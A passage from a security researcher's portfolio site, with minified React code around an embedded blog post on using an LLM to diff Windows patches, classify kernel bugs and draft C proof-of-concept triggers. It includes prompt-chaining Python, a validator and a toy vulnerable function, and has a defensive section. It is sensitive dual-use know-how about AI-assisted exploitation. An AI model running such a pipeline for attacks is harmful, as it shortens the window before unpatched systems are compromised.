</code></pre>
<p>{patched_code}</p>
<pre><code>

### Analysis Tasks

**Task 1 — Vulnerability Classification**
Examine the diff between the two versions. Classify the vulnerability 
into one of: buffer overflow, integer overflow, out-of-bounds read/write, 
use-after-free, type confusion, race condition, null pointer dereference, 
logic bug, or other (specify).

Identify the EXACT lines that changed and explain what they reveal.

**Task 2 — Reachability Assessment**
Given the known callers listed above, assess:
- Can an unprivileged user-mode process trigger this code path?
- What Windows API calls or operations would lead here?
- Are there any gating checks that limit reachability?

**Task 3 — Exploitation Primitive**
If the vulnerability is triggerable:
- What memory corruption primitive does it provide? 
  (arbitrary write, relative write, read, info leak, etc.)
- What is the corruption target? (adjacent heap object, stack variable, etc.)
- What&#x27;s the attacker-controlled input that influences the corruption?

**Task 4 — Trigger Sketch**
Write a minimal C proof-of-concept skeleton that would:
1. Reach the vulnerable function
2. Supply the input that triggers the vulnerability
Do NOT write a full exploit. Just reach the bug.

### Output Format
Respond with clearly labeled sections matching each task number.
For Task 1, also include a confidence score (low/medium/high) for 
your classification.
&quot;&quot;&quot;
    return prompt
</code></pre>
<h3>Multi-Round Chaining — Why Single Prompts Aren&#x27;t Enough</h3>
<p>Don&#x27;t ask one mega-question. Chain the analysis across multiple rounds so each step validates the previous one.</p>
<pre><code class="language-python">
import anthropic
from typing import Dict, Any

class VulnAnalyzer:
    &quot;&quot;&quot;
    Multi-round LLM analysis pipeline for vulnerability classification.
    
    Each round builds on the previous, with validation between steps.
    This catches hallucinations early before they compound.
    &quot;&quot;&quot;
    
    def __init__(self, model=&quot;claude-sonnet-4-20250514&quot;):
        self.client = anthropic.Anthropic()
        self.model = model
        self.conversation_history = []
    
    def analyze(self, func_diff, original_code, patched_code, callers) -&gt; Dict[str, Any]:
        results = {}
        
        # --- Round 1: Classification ---
        r1_prompt = f&quot;&quot;&quot;Analyze this binary patch. I&#x27;ll show you the original 
and patched versions of function \`{func_diff.name}\`.

ORIGINAL (vulnerable):
</code></pre>
<p>{original_code}</p>
<pre><code>

PATCHED (fixed):
</code></pre>
<p>{patched_code}</p>
<pre><code>

Classify the vulnerability type. What specific code change reveals it?
Confidence: low/medium/high.
Respond concisely — classification + evidence only.&quot;&quot;&quot;

        r1_response = self._ask(r1_prompt)
        results[&quot;classification&quot;] = r1_response
        
        # --- Round 2: Reachability (only if R1 is high confidence) ---
        if &quot;high&quot; in r1_response.lower() or &quot;medium&quot; in r1_response.lower():
            r2_prompt = f&quot;&quot;&quot;Good. Now assess reachability.

Known callers of \`{func_diff.name}\`: {&#x27;, &#x27;.join(callers)}

Can an unprivileged user-mode process reach this function?
What API calls or operations would trigger it?
Be specific about the call chain.&quot;&quot;&quot;

            r2_response = self._ask(r2_prompt)
            results[&quot;reachability&quot;] = r2_response
        
        # --- Round 3: Exploitation primitive ---
        r3_prompt = &quot;&quot;&quot;Based on your classification and reachability analysis:

What exploitation primitive does this give an attacker?
(arbitrary write, relative OOB, info leak, etc.)

What is the corrupted target and what does the attacker control?&quot;&quot;&quot;

        r3_response = self._ask(r3_prompt)
        results[&quot;exploitation&quot;] = r3_response
        
        # --- Round 4: PoC skeleton ---
        r4_prompt = &quot;&quot;&quot;Write a minimal C proof-of-concept that reaches the 
vulnerable function with attacker-controlled input.

Requirements:
- Must compile on Windows (use Win32 APIs)
- Just trigger the bug, don&#x27;t exploit it
- Include comments explaining each step
- Use the specific call chain you identified&quot;&quot;&quot;

        r4_response = self._ask(r4_prompt)
        results[&quot;poc_skeleton&quot;] = r4_response
        
        return results
    
    def _ask(self, prompt: str) -&gt; str:
        &quot;&quot;&quot;Send a message maintaining conversation context.&quot;&quot;&quot;
        self.conversation_history.append({
            &quot;role&quot;: &quot;user&quot;, 
            &quot;content&quot;: prompt
        })
        
        response = self.client.messages.create(
            model=self.model,
            max_tokens=4096,
            system=&quot;&quot;&quot;You are an expert vulnerability researcher 
specializing in Windows kernel security. You analyze binary patches 
to identify and classify vulnerabilities. Be precise, technical, 
and concise. Do not speculate beyond what the code shows.&quot;&quot;&quot;,
            messages=self.conversation_history
        )
        
        assistant_msg = response.content[0].text
        self.conversation_history.append({
            &quot;role&quot;: &quot;assistant&quot;,
            &quot;content&quot;: assistant_msg
        })
        
        return assistant_msg
</code></pre>
<hr />
<h2>Stage 5: Validation — Catching Hallucinations</h2>
<p>The LLM <em>will</em> be wrong sometimes. It hallucinates Win32 API calls, invents struct fields that don&#x27;t exist, and misclassifies subtle bugs. You need automated sanity checks.</p>
<pre><code class="language-python">
import re
from dataclasses import dataclass
from typing import List, Tuple

@dataclass
class ValidationResult:
    passed: bool
    score: float  # 0.0 to 1.0
    issues: List[str]
    

class PatchValidator:
    &quot;&quot;&quot;
    Validates LLM vulnerability analysis against known heuristics.
    
    This doesn&#x27;t prove the analysis is correct, but it catches
    obviously wrong classifications and hallucinated details.
    &quot;&quot;&quot;
    
    # Map of patch patterns to expected vulnerability classes
    PATCH_PATTERNS = {
        &quot;bounds_check_added&quot;: {
            &quot;pattern&quot;: r&quot;if\\s*\\([^)]*[&lt;&gt;]=?\\s*\\d+&quot;,
            &quot;expected_classes&quot;: [
                &quot;buffer overflow&quot;, &quot;out-of-bounds&quot;, 
                &quot;integer overflow&quot;
            ],
            &quot;confidence_boost&quot;: 0.3
        },
        &quot;null_check_added&quot;: {
            &quot;pattern&quot;: r&quot;if\\s*\\([^)]*[!=]=\\s*(NULL|0|nullptr)&quot;,
            &quot;expected_classes&quot;: [
                &quot;null pointer dereference&quot;, &quot;use-after-free&quot;
            ],
            &quot;confidence_boost&quot;: 0.25
        },
        &quot;lock_added&quot;: {
            &quot;pattern&quot;: r&quot;(mutex|spinlock|lock|critical_section|KeAcquire|ExAcquire)&quot;,
            &quot;expected_classes&quot;: [&quot;race condition&quot;],
            &quot;confidence_boost&quot;: 0.4
        },
        &quot;size_validation&quot;: {
            &quot;pattern&quot;: r&quot;(size|length|count|num)\\s*[&lt;&gt;]=?\\s*&quot;,
            &quot;expected_classes&quot;: [
                &quot;buffer overflow&quot;, &quot;integer overflow&quot;, 
                &quot;out-of-bounds&quot;
            ],
            &quot;confidence_boost&quot;: 0.35
        },
        &quot;type_check_added&quot;: {
            &quot;pattern&quot;: r&quot;(type|kind|tag)\\s*[!=]=\\s*&quot;,
            &quot;expected_classes&quot;: [&quot;type confusion&quot;],
            &quot;confidence_boost&quot;: 0.3
        }
    }
    
    def validate_classification(
        self, 
        llm_classification: str,
        original_code: str,
        patched_code: str
    ) -&gt; ValidationResult:
        &quot;&quot;&quot;
        Cross-check the LLM&#x27;s vulnerability classification against 
        observable patch patterns.
        &quot;&quot;&quot;
        issues = []
        score = 0.5  # Start neutral
        
        # Find what was ADDED in the patch
        # (Naive approach — real implementation should use AST diffing)
        patched_lines = set(patched_code.splitlines())
        original_lines = set(original_code.splitlines())
        new_lines = patched_lines - original_lines
        new_code = &quot;\\n&quot;.join(new_lines)
        
        matched_patterns = []
        
        for pattern_name, pattern_info in self.PATCH_PATTERNS.items():
            if re.search(pattern_info[&quot;pattern&quot;], new_code, re.IGNORECASE):
                matched_patterns.append(pattern_name)
                
                # Check if LLM&#x27;s classification aligns 
                # with what the patch pattern suggests
                llm_class_lower = llm_classification.lower()
                expected = pattern_info[&quot;expected_classes&quot;]
                
                if any(exp in llm_class_lower for exp in expected):
                    score += pattern_info[&quot;confidence_boost&quot;]
                else:
                    issues.append(
                        f&quot;Patch pattern &#x27;{pattern_name}&#x27; suggests &quot;
                        f&quot;{expected}, but LLM classified as: &quot;
                        f&quot;&#x27;{llm_classification}&#x27;&quot;
                    )
                    score -= 0.2
        
        if not matched_patterns:
            issues.append(
                &quot;No recognizable patch patterns found — &quot;
                &quot;manual review recommended&quot;
            )
            score -= 0.1
        
        # Check for common hallucination indicators
        hallucination_flags = self._check_hallucinations(
            llm_classification, patched_code
        )
        issues.extend(hallucination_flags)
        score -= 0.15 * len(hallucination_flags)
        
        score = max(0.0, min(1.0, score))
        
        return ValidationResult(
            passed=score &gt;= 0.5 and len(hallucination_flags) == 0,
            score=score,
            issues=issues
        )
    
    def _check_hallucinations(
        self, 
        classification: str, 
        patched_code: str
    ) -&gt; List[str]:
        &quot;&quot;&quot;
        Detect common LLM hallucination patterns in vuln analysis.
        &quot;&quot;&quot;
        flags = []
        
        # If LLM says &quot;race condition&quot; but no sync primitives 
        # were added, it&#x27;s likely wrong
        if &quot;race&quot; in classification.lower():
            sync_evidence = re.search(
                r&quot;(lock|mutex|spinlock|atomic|interlocked)&quot;,
                patched_code, re.IGNORECASE
            )
            if not sync_evidence:
                flags.append(
                    &quot;HALLUCINATION: &#x27;race condition&#x27; classified but &quot;
                    &quot;no synchronization primitives found in patch&quot;
                )
        
        # If LLM says &quot;use-after-free&quot; but the patch only 
        # adds bounds checks, probably wrong
        if &quot;use-after-free&quot; in classification.lower():
            if not re.search(r&quot;(free|release|delete|deref)&quot;, 
                           patched_code, re.IGNORECASE):
                flags.append(
                    &quot;SUSPECT: &#x27;use-after-free&#x27; classified but no &quot;
                    &quot;free/release related changes visible&quot;
                )
        
        return flags
    
    def validate_poc_compiles(self, poc_code: str) -&gt; Tuple[bool, str]:
        &quot;&quot;&quot;
        Attempt to compile the PoC skeleton to catch hallucinated APIs.
        Uses cl.exe (MSVC) or x86_64-w64-mingw32-gcc as fallback.
        
        Returns (success, error_message).
        &quot;&quot;&quot;
        import tempfile
        
        with tempfile.NamedTemporaryFile(
            suffix=&quot;.c&quot;, mode=&quot;w&quot;, delete=False
        ) as f:
            f.write(poc_code)
            f.flush()
            
            # Try MinGW cross-compilation (Linux) 
            # or MSVC (Windows)
            try:
                result = subprocess.run(
                    [
                        &quot;x86_64-w64-mingw32-gcc&quot;,
                        &quot;-c&quot;,          # Compile only, don&#x27;t link
                        &quot;-fsyntax-only&quot;,
                        f.name
                    ],
                    capture_output=True, text=True, timeout=30
                )
                
                if result.returncode == 0:
                    return True, &quot;&quot;
                else:
                    return False, result.stderr
                    
            except FileNotFoundError:
                return False, &quot;No cross-compiler available&quot;
</code></pre>
<h3>Confidence Scoring — Putting It All Together</h3>
<pre><code class="language-python">
def compute_final_confidence(
    diaphora_score: float,
    llm_classification_confidence: str,
    validation_result,  # ValidationResult
    llm_consistency: float  # Agreement across N independent runs
) -&gt; dict:
    &quot;&quot;&quot;
    Aggregate confidence score from all pipeline stages.
    
    A high score means: the patch pattern matches the LLM&#x27;s 
    classification, the LLM is confident, and multiple runs agree.
    &quot;&quot;&quot;
    
    confidence_map = {&quot;low&quot;: 0.3, &quot;medium&quot;: 0.6, &quot;high&quot;: 0.9}
    llm_conf = confidence_map.get(
        llm_classification_confidence.lower(), 0.5
    )
    
    # Weighted combination
    weights = {
        &quot;patch_heuristic&quot;: 0.25,
        &quot;llm_confidence&quot;: 0.25,
        &quot;validation_score&quot;: 0.25,
        &quot;consistency&quot;: 0.25
    }
    
    final_score = (
        weights[&quot;patch_heuristic&quot;] * diaphora_score +
        weights[&quot;llm_confidence&quot;] * llm_conf +
        weights[&quot;validation_score&quot;] * validation_result.score +
        weights[&quot;consistency&quot;] * llm_consistency
    )
    
    # Determine action
    if final_score &gt;= 0.8:
        action = &quot;HIGH_PRIORITY — likely exploitable, begin manual analysis&quot;
    elif final_score &gt;= 0.6:
        action = &quot;MEDIUM — worth investigating, may need manual validation&quot;
    elif final_score &gt;= 0.4:
        action = &quot;LOW — possible false positive, review if time permits&quot;
    else:
        action = &quot;SKIP — likely misclassification or non-security change&quot;
    
    return {
        &quot;final_score&quot;: round(final_score, 3),
        &quot;action&quot;: action,
        &quot;breakdown&quot;: {
            &quot;patch_heuristic&quot;: diaphora_score,
            &quot;llm_confidence&quot;: llm_conf,
            &quot;validation&quot;: validation_result.score,
            &quot;consistency&quot;: llm_consistency
        },
        &quot;issues&quot;: validation_result.issues
    }
</code></pre>
<hr />
<h2>A Concrete Example: Walking Through a Real Patch</h2>
<p>Let&#x27;s trace through a simplified but realistic example. Imagine a Patch Tuesday fix for a kernel callback function.</p>
<h3>The Diff</h3>
<p><strong>Before (vulnerable):</strong></p>
<pre><code class="language-c">
void CmpCallCallBacks(PCMHIVE Hive, int Type) {
    PVOID buffer = Hive-&gt;CallbackListHead;
    int count = *(int*)(buffer + 0x10);
    
    for (int i = 0; i &lt; count; i++) {
        PCALLBACK_ENTRY entry = (PCALLBACK_ENTRY)(buffer + i * 0x28);
        if (entry-&gt;Routine != NULL) {
            entry-&gt;Routine(entry-&gt;Context, Type);
        }
    }
}
</code></pre>
<p><strong>After (patched):</strong></p>
<pre><code class="language-c">
void CmpCallCallBacks(PCMHIVE Hive, int Type) {
    PVOID buffer = Hive-&gt;CallbackListHead;
    int count = *(int*)(buffer + 0x10);
    
    // === PATCH: bounds validation added ===
    if (count &lt; 0 || count &gt; MAX_CALLBACKS) {
        return;  
    }
    
    for (int i = 0; i &lt; count; i++) {
        PCALLBACK_ENTRY entry = (PCALLBACK_ENTRY)(buffer + i * 0x28);
        if (entry-&gt;Routine != NULL) {
            entry-&gt;Routine(entry-&gt;Context, Type);
        }
    }
}
</code></pre>
<h3>What the LLM sees</h3>
<p>When fed this through the structured prompt, a good model will identify:</p>
<ol>
<li><strong>Classification</strong>: Integer overflow / out-of-bounds access (HIGH confidence). The <code>count</code> value is read from attacker-influenced memory (<code>Hive-&gt;CallbackListHead + 0x10</code>) with no validation. A negative or very large <code>count</code> causes the loop to read/execute from out-of-bounds memory.</li>
</ol>
<ol>
<li><strong>Reachability</strong>: <code>CmpCallCallBacks</code> is called from <code>CmpPostNotify</code> and <code>CmUnRegisterCallback</code>. Registry operations from user-mode can reach this path. A crafted registry hive could influence the <code>CallbackListHead</code> structure.</li>
</ol>
<ol>
<li><strong>Primitive</strong>: Out-of-bounds read leading to a controlled function pointer call. If the attacker can influence the memory at <code>buffer + i * 0x28</code>, they control <code>entry-&gt;Routine</code> — a direct kernel code execution primitive.</li>
</ol>
<ol>
<li><strong>PoC sketch</strong>: Load a crafted registry hive via <code>RegLoadKey()</code> with a malformed callback list.</li>
</ol>
<hr />
<h2>Where LLMs Fail (and Why This Matters)</h2>
<p>Documenting failure modes is just as important as the successes. From extensive testing, here&#x27;s where models consistently struggle:</p>
<p><strong>1. Deeply nested struct manipulation</strong> When the vulnerability involves pointer arithmetic across 3+ levels of struct nesting, models lose track of offsets. They&#x27;ll say &quot;field X is at offset 0x18&quot; when it&#x27;s actually at 0x20 because they miscounted a union.</p>
<p><strong>2. Compiler optimization artifacts</strong> Ghidra&#x27;s decompiler sometimes produces code that looks buggy but is actually an optimization artifact. Models flag these as vulnerabilities — false positives.</p>
<p><strong>3. Subtle race conditions</strong> Time-of-check-to-time-of-use (TOCTOU) bugs are hard for models because the vulnerability exists <em>between</em> two functions, not within one. The model sees each function in isolation and misses the window.</p>
<p><strong>4. Implicit type conversions</strong> Signed/unsigned comparison bugs are notoriously subtle. <code>if (user_input &lt; buffer_size)</code> looks safe, but if <code>user_input</code> is a signed int and negative, the comparison passes on some compilers. Models miss this about 60% of the time in testing.</p>
<p><strong>5. Custom allocator semantics</strong> Windows kernel uses pool allocators with specific tag-based semantics. Models don&#x27;t understand that <code>ExAllocatePoolWithTag</code> memory has specific alignment and adjacency properties that affect exploitability.</p>
<hr />
<hr />
<h2>The Defender&#x27;s Perspective</h2>
<p>If you&#x27;re on a blue team reading this, the implications are uncomfortable. This pipeline compresses the 1-day exploitation window from weeks (when only elite researchers could find the bug) to potentially <em>hours</em> (when anyone with API access and this script can triage patches).</p>
<p>What this means practically:</p>
<ul>
<li><strong>Patch faster</strong>. The &quot;we&#x27;ll patch next month&quot; window is closing.</li>
<li><strong>Prioritize by exploitability</strong>, not just CVSS score. A &quot;7.5 Medium&quot; with a trivially reachable code path might be more dangerous than a &quot;9.8 Critical&quot; that requires local admin.</li>
<li><strong>Monitor for this tooling</strong>. If you see automated Ghidra analysis + LLM API calls spinning up every Patch Tuesday, someone&#x27;s running this pipeline.</li>
</ul>
<hr />
<h2>What Doesn&#x27;t Exist Yet (Your Research Opportunities)</h2>
<ol>
<li><strong>A proper benchmark dataset</strong> — Matched pairs of (vulnerable_function, patched_function, CVE_class, exploitability_score) for hundreds of real CVEs. This would let the community properly evaluate and improve models.</li>
</ol>
<ol>
<li><strong>Head-to-head model evaluation</strong> — Nobody has rigorously compared models on this specific task with controlled methodology.</li>
</ol>
<ol>
<li><strong>End-to-end open-source tooling</strong> — Everything described here is duct-taped together. A clean, maintained pipeline would be enormously useful.</li>
</ol>
<ol>
<li><strong>Fine-tuning on historical CVEs</strong> — Take every known patched vulnerability, extract the before/after binaries, and build a training dataset. The potential accuracy improvement is huge but unexplored.</li>
</ol>
<ol>
<li><strong>Hybrid approaches</strong> — LLM does the classification and rough trigger hypothesis, then symbolic execution (angr/Triton) does precise path constraint solving. This combination could be significantly more powerful than either alone.</li>
</ol>
<hr />
<h2>Conclusion</h2>
<p>LLM-assisted binary diffing isn&#x27;t theoretical — it&#x27;s buildable today with existing tools and APIs. The pipeline described here (Winbindex → Diaphora → Ghidra → structured prompts → multi-round LLM analysis → validation) turns Patch Tuesday into a semi-automated vulnerability discovery process.</p>
<p>The models aren&#x27;t perfect. They hallucinate, miss subtle bugs, and struggle with complex memory semantics. But as a <em>triage</em> tool — rapidly sorting through hundreds of changed functions to surface the 3-5 that are security-relevant — they&#x27;re already transformative.</p>
<p>The 1-day window just got a lot shorter. Whether that&#x27;s terrifying or exciting depends on which side of the patch you&#x27;re sitting on.</p>
<hr />
<p><em>Want to discuss this further or contribute to building the pipeline? Open an issue or reach out.</em></p>
`,Xm={llm_assisted_binary_diffing_blog:{title:"LLM-Assisted Binary Diffing: Finding 1-Days Before PoCs Drop",slug:"llm_assisted_binary_diffing_blog",content:Ym},llm_multistage_attacks_technical_breakdown_full:{title:"On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown",slug:"llm_multistage_attacks_technical_breakdown_full",content:Km},villager_inside_out:{title:"Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)",slug:"villager_inside_out",content:Gm},firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:zm},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:Hm},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:Vm},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:$m},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:Wm},1001:{title:"CVE-2024–1001",slug:"1001",content:Im},"0012":{title:"CVE-2024–0012",slug:"0012",content:Mm},40982:{title:"CVE-2022–40982",slug:"40982",content:Om},cow:{title:"CVE-2016–5195",slug:"cow",content:Dm},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:Um},23397:{title:"CVE-2023–23397",slug:"23397",content:Rm},"0160":{title:"CVE-2014-0160",slug:"0160",content:jm},11882:{title:"CVE-2017-11882",slug:"11882",content:qm},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:Bm},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:Fm}};function Qm(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const a=t.querySelector("h1");a&&a.remove();const r=[".blog-text","article",".blog-post-content","main"];let i=t.body;for(const l of r){const c=t.querySelector(l);if(c){i=c;break}}return i.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(i.querySelectorAll("h2, h3")).forEach((l,c)=>{l.id||(l.id=`section-${c+1}`)}),i.innerHTML||e}catch{return e}}function Id({slug:e,onClose:n}){const t=Xm[e],s=me.find(r=>r.slug===e),a=w.useMemo(()=>t?Qm(t.content):"",[t]);return w.useEffect(()=>{if(!t)return;const r=document.querySelector(".pv-comments");if(!r)return;r.innerHTML="";const i=document.createElement("script");return i.src="https://giscus.app/client.js",i.async=!0,i.crossOrigin="anonymous",i.setAttribute("data-giscus","true"),i.setAttribute("data-repo","Hem1700/hem1700.github.io"),i.setAttribute("data-repo-id","R_kgDONilgZg"),i.setAttribute("data-category","General"),i.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),i.setAttribute("data-mapping","pathname"),i.setAttribute("data-strict","1"),i.setAttribute("data-reactions-enabled","1"),i.setAttribute("data-emit-metadata","0"),i.setAttribute("data-input-position","top"),i.setAttribute("data-lang","en"),i.setAttribute("data-theme","dark"),r.appendChild(i),()=>{r.innerHTML=""}},[e,t]),t?o.jsxs("div",{className:"pv",children:[o.jsxs("div",{className:"pv-bar",children:[o.jsx("div",{className:"pv-close",onClick:n,children:"✕"}),o.jsx("div",{className:"pv-ti",children:t.title})]}),o.jsxs("div",{className:"pv-body",children:[o.jsx("h1",{className:"pv-title",children:t.title}),s&&o.jsxs("div",{className:"pv-meta",children:[s.date," · ",s.readTime," · ",s.category]}),o.jsx("div",{className:"pv-content",dangerouslySetInnerHTML:{__html:a}})]}),o.jsx("div",{className:"pv-comments"})]}):o.jsxs("div",{className:"pv",children:[o.jsxs("div",{className:"pv-bar",children:[o.jsx("div",{className:"pv-close",onClick:n,children:"✕"}),o.jsx("div",{className:"pv-ti",children:"Post not found"})]}),o.jsxs("div",{className:"pv-body",children:[o.jsx("h1",{className:"pv-title",children:"Post not found"}),o.jsx("p",{children:"Signal lost. Close this and try another post from the Notes app."})]})]})}function Jm(){const[e,n]=w.useState([]),[t,s]=w.useState(null),[a,r]=w.useState(!1),i=w.useRef(0),l=w.useRef(1),c=w.useCallback((d,h)=>{n(x=>{const b=x.find(I=>I.app===d);if(b){l.current+=1;const I=l.current;return s(b.id),x.map(j=>j.id===b.id?{...j,minimized:!1,z:I,appState:h??j.appState}:j)}const E=xe[d];if(!E)return x;i.current+=1,l.current+=1;const C=i.current,A=x.length*28;return s(C),[...x,{id:C,app:d,x:100+A,y:70+A,w:E.w,h:E.h,minimized:!1,maximized:!1,z:l.current,appState:h??null}]})},[]),u=w.useCallback(d=>{n(h=>h.filter(x=>x.id!==d)),s(h=>h===d?null:h)},[]),f=w.useCallback(d=>{n(h=>h.map(x=>x.id===d?{...x,minimized:!0}:x))},[]),p=w.useCallback(d=>{n(h=>h.map(x=>x.id===d?{...x,maximized:!x.maximized}:x))},[]),g=w.useCallback(d=>{l.current+=1;const h=l.current;s(d),n(x=>x.map(b=>b.id===d?{...b,z:h,minimized:!1}:b))},[]),v=w.useCallback((d,h,x)=>{n(b=>b.map(E=>E.id===d?{...E,x:h,y:x}:E))},[]),k=w.useCallback((d,h,x)=>{n(b=>b.map(E=>E.id===d?{...E,w:h,h:x}:E))},[]),y=w.useCallback((d,h)=>{n(x=>x.map(b=>b.id===d?{...b,appState:{...b.appState||{},...h}}:b))},[]),S=w.useCallback(()=>r(d=>!d),[]),m=w.useCallback(()=>r(!1),[]);return{windows:e,focusId:t,spotlightOpen:a,launch:c,close:u,minimize:f,toggleMaximize:p,focus:g,move:v,resize:k,updateAppState:y,toggleSpotlight:S,closeSpotlight:m}}const Zm=To.slice(0,6);function Eo({onLaunch:e}){return o.jsxs("div",{className:"ar",children:[o.jsx("h1",{children:"Welcome to HEM-OS."}),o.jsx("div",{className:"sb",children:"// boot complete · all subsystems online"}),o.jsx("p",{children:"This is Hem Parekh's portfolio, but installed as an operating system. Every section lives in an app. Open the dock, double-click, drag windows, type commands."}),o.jsxs("div",{className:"tp",children:["Press ",o.jsx("kbd",{children:"⌘K"})," (or ",o.jsx("kbd",{children:"Ctrl+K"}),") for spotlight — search across apps, posts, projects, and CVEs."]}),o.jsx("p",{children:"Quick launch:"}),o.jsx("div",{className:"ql",children:Zm.map(n=>{const t=xe[n],s=t.title.split("—")[0].trim(),a=(t.title.split("—")[1]||"").trim();return o.jsxs("div",{className:"q",onClick:()=>e(n),children:[o.jsx("div",{className:`mi ${t.g}`}),o.jsxs("div",{children:[o.jsx("div",{style:{fontWeight:600},children:s}),o.jsx("div",{style:{fontSize:11,color:"var(--mut)",fontFamily:"var(--mono)"},children:a})]})]},n)})}),o.jsxs("p",{style:{color:"var(--mut)",fontSize:12,fontFamily:"var(--mono)",marginTop:24},children:["// Try the Terminal: type"," ",o.jsx("span",{style:{color:"var(--acc2)"},children:"cves"}),","," ",o.jsx("span",{style:{color:"var(--acc2)"},children:"cat .now"}),", or"," ",o.jsx("span",{style:{color:"var(--acc2)"},children:"fortune"}),"."]})]})}function qd(){const e=re.name.split(" ").map(n=>n[0]).join("");return o.jsxs("div",{className:"afi",children:[o.jsxs("div",{className:"sd",children:[o.jsx("div",{className:"gp",children:"Profile"}),o.jsxs("div",{className:"it on",children:[o.jsx("span",{className:"d",style:{background:"linear-gradient(135deg,var(--acc),var(--acc3))"}}),"about.txt"]}),o.jsxs("div",{className:"it",children:[o.jsx("span",{className:"d",style:{background:"var(--acc2)"}}),"manifesto.md"]}),o.jsxs("div",{className:"it",children:[o.jsx("span",{className:"d",style:{background:"var(--ylw)"}}),"numbers.csv"]})]}),o.jsxs("div",{className:"mn",children:[o.jsxs("div",{className:"hr",children:[o.jsx("div",{className:"av",children:e}),o.jsxs("div",{children:[o.jsx("h1",{children:re.name}),o.jsx("div",{className:"role",children:re.role}),o.jsxs("div",{className:"meta",children:[o.jsxs("span",{children:["● ",re.current]}),o.jsxs("span",{children:["📍 ",re.location]}),o.jsxs("span",{children:["⏱ ",re.tz]})]})]})]}),o.jsxs("div",{className:"sec",children:[o.jsx("h2",{children:"// about"}),o.jsx("div",{style:{fontSize:14,lineHeight:1.6,color:"var(--ink-d)"},children:Em.text})]}),o.jsxs("div",{className:"sec",children:[o.jsx("h2",{children:"// manifesto"}),ra.map((n,t)=>o.jsxs("div",{className:"bel",children:[o.jsx("span",{className:"k",children:n.k}),n.v]},t))]}),o.jsxs("div",{className:"sec",children:[o.jsx("h2",{children:"// numbers"}),o.jsx("div",{className:"st",children:Lm.map((n,t)=>o.jsxs("div",{className:"s",children:[o.jsx("div",{className:"n",children:n.n}),o.jsx("div",{className:"l",children:n.l})]},t))})]})]})]})}function Rd({initialSlug:e,onOpenPost:n}){const[t,s]=w.useState(""),[a,r]=w.useState(e||me[0]&&me[0].slug);w.useEffect(()=>{e&&r(e)},[e]);const i=w.useMemo(()=>{if(!t)return me;const c=t.toLowerCase();return me.filter(u=>u.title.toLowerCase().includes(c)||u.excerpt.toLowerCase().includes(c)||(u.category||"").toLowerCase().includes(c))},[t]),l=me.find(c=>c.slug===a)||me[0];return o.jsxs("div",{className:"an",children:[o.jsxs("div",{className:"ls",children:[o.jsx("div",{className:"search",children:o.jsx("input",{value:t,onChange:c=>s(c.target.value),placeholder:"search posts…",spellCheck:!1})}),i.map(c=>o.jsxs("div",{className:`it ${c.slug===a?"on":""}`,onClick:()=>r(c.slug),children:[o.jsx("div",{className:"ttl",children:c.title}),o.jsxs("div",{className:"mt",children:[o.jsx("span",{children:c.date}),o.jsx("span",{children:"·"}),o.jsx("span",{children:c.readTime}),o.jsxs("span",{className:"tg",children:["[",c.category,"]"]})]})]},c.slug)),i.length===0&&o.jsx("div",{className:"it",style:{color:"var(--mut)"},children:"no matches"})]}),o.jsx("div",{className:"dt",children:l&&o.jsxs(o.Fragment,{children:[o.jsx("h1",{children:l.title}),o.jsxs("div",{className:"mt",children:[l.date," · ",l.readTime," · ",l.category]}),o.jsx("div",{className:"bd",children:o.jsx("p",{children:l.excerpt})}),o.jsx("div",{className:"max",onClick:()=>n&&n(l.slug),children:"⤢ Maximize — read full post"})]})})]})}function Xl(e){return Ct[e.title]||{code:e.title.split(" ").map(n=>n[0]).join("").slice(0,4).toUpperCase(),status:"—",metric:"—",stack:e.tags||[]}}function Od({initialTitle:e}){const[n,t]=w.useState(null);if(w.useEffect(()=>{if(e){const s=Nn.findIndex(a=>a.title===e);s>=0&&t(s)}else t(null)},[e]),n!==null){const s=Nn[n],a=Xl(s);return o.jsx("div",{className:"af",children:o.jsxs("div",{className:"pdr",children:[o.jsx("button",{type:"button",className:"bk bk-button",onClick:()=>t(null),children:"← projects"}),o.jsx("h2",{children:s.title}),o.jsxs("div",{className:"ct",children:[a.code," · ",(s.tags||[]).join(" / ")," · ",a.status]}),o.jsx("p",{className:"bl",children:s.description}),o.jsxs("div",{className:"sp",children:[o.jsxs("div",{className:"s",children:[o.jsx("div",{className:"l",children:"METRIC"}),o.jsx("div",{className:"v",children:a.metric})]}),o.jsxs("div",{className:"s",children:[o.jsx("div",{className:"l",children:"STATUS"}),o.jsx("div",{className:"v",children:a.status})]})]}),o.jsx("div",{className:"sk",children:a.stack.map(r=>o.jsx("span",{className:"ch",children:r},r))}),s.href&&s.href!=="#"&&o.jsx("p",{style:{marginTop:18},children:o.jsxs("a",{href:s.href,target:"_blank",rel:"noreferrer",style:{color:"var(--acc2)",fontFamily:"var(--mono)",fontSize:12},children:[s.href," →"]})})]})})}return o.jsxs("div",{className:"af",children:[o.jsx("div",{className:"tb2",children:o.jsxs("div",{className:"crm",children:["/home/hem",o.jsx("span",{className:"sp",children:"›"}),"projects"]})}),o.jsx("div",{className:"grd",children:Nn.map((s,a)=>{const 